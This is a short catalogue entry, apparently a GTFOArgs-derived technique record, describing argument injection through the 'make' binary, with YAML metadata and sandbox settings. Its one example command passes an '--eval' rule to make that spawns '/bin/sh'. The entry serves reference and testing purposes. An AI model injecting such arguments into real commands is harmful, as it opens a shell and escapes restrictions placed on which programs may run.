---
trust_level: community
id: argument-injection-make
namespace: argument:injection:make
name: make
description: "Argument injection via make"
version: "1.0.0"
capabilities:
  - security.execution.command
platforms:
  - cross-platform
techniques:
  - execution
execution:
  template: "make"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Can be used to execute arbitrary commands on a system and spawn shells either indirectly"
    command: "make -s --eval=$'x:\\n\\t-'\"/bin/sh\"
"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/make/"
---

# make

GTFOArgs entry for make. This binary can be used to inject arguments for execution, file operations, or other capabilities.
